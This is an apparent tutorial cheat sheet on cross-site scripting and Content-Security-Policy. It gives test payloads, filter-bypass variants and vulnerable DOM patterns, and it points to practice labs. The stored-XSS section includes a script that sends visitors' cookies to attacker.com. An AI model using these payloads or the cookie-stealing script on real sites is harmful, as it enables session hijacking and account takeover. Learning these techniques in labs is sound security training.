# XSS attacks and CSP — inject, steal, bypass

Three types: reflected (in URL), stored (persisted in DB), DOM (JavaScript reads attacker input).

## Basic test payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
javascript:alert(1)
```

## Reflected XSS

Find a search or error page that echoes input back in the HTML.

```
http://localhost/?search=<script>alert(1)</script>
```

View page source — look for your payload unencoded in the HTML. If it executes: reflected XSS.

## Stored XSS

Submit payload to a comment, profile field, or any input that other users see.

```html
<!-- In a comment field -->
<script>document.location='http://attacker.com/log?c='+document.cookie</script>
```

When any user views that page, their cookies are sent to `attacker.com`.

## DOM XSS

No server round-trip. JS reads from URL and writes to DOM unsafely.

```javascript
// Vulnerable pattern
document.write(location.hash.slice(1))
document.getElementById('output').innerHTML = location.search

// Trigger in URL
http://localhost/page#<img src=x onerror=alert(1)>
```

## Filter bypass techniques

```html
<!-- When <script> is filtered -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Encoding -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

## CSP — what it blocks and how to check

CSP header restricts what scripts can run:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Check a site's CSP: https://securityheaders.com

Weak CSP — still exploitable:
```
Content-Security-Policy: script-src 'unsafe-inline'   ← inline scripts still work
Content-Security-Policy: script-src *                  ← any domain
```

## Practice

PortSwigger XSS labs (20+ labs): https://portswigger.net/web-security/cross-site-scripting
DVWA XSS Reflected, XSS Stored modules (set security to Low → Medium → High).
